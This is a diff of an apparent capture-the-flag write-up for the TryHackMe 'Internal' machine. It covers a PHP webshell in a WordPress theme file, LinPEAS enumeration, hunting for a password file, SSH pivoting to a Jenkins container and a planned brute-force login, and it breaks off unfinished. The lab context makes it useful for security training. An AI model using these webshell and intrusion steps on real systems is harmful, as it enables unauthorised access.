@@ -7,7 +7,7 @@ tags = ["tryhackme", "security", "pentest", "oscp"]
 
 Box: Internal\
 Platform: Try Hack Me\
-Grade: Medium
+Grade: Hard
 
 ## Service Enumeration
 
@@ -80,6 +80,8 @@ system($_GET[cmd]);
 
 # Testing the shell
 curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ````
@@ -135,7 +137,63 @@ select * from wp_users;
 
 Only admin user was found. It doesn't give anything new as I already have WP admin account. 
 
+## Privilege Escalation
 
+Manual enumeration was a dead end at this point so running LinPEAS seemed like a good idea to check whether I had missed something. 
 
+````
+# Get the code
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# Move to target, set permissions and run.
+./linpeas.sh
+
+# Found another user and a password.
+phpmyadmin
+````
+
+## phpMyAdmin Enumeration
+
+phpMyAdmin is a web-based MySQL db management tool based on PHP and hosted on a web server.
+
+5.7.31
+
+This version seems to suffer from CVE-2016-6663. 
+
+Exploit code is availabe: https://www.exploit-db.com/exploits/40678
+
+To be able to escalate privileges I need mysql user account. I could try to upload a rshell using phpMyAdmin.
+
+## Linux Password Hunt
+
+I started to have a feeling that I was making this more complicated than needed so I went back to basics.
+
+````
+# Looking for file content related to known user accounts
+grep -r -l 'aubreanna' / 2>/dev/null
+
+# Interesting file that seems to include password for aubreanna
+/opt/wp-save.txt
+````
+
+## Lateral Movement
+
+````
+# SSH in
+ssh -l aubreanna internal.thm
+````
+
+User flag in /home/aubreanna. Also home folder contains a message that Jenkins is running on 
+172.17.0.2:8080. This should be cool because a common mistake with Jenkins is that it runs a root and it has a live console. Running ip a tells that the Jenkins instance is running as a Docker container. 
+
+## Pivoting to Jenkins
+
+````
+ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm
+````
+
+Jenkins can be accessed now with attack box's browser: localhost:1234
+
+Default credentials (admin:password) doesn't work. Also because it runs as a Docker container and aubreanna doesn't have rights to manage Docker I can't do much. The last resort remain: Let's try brute force login.
 
 CONTINUES...
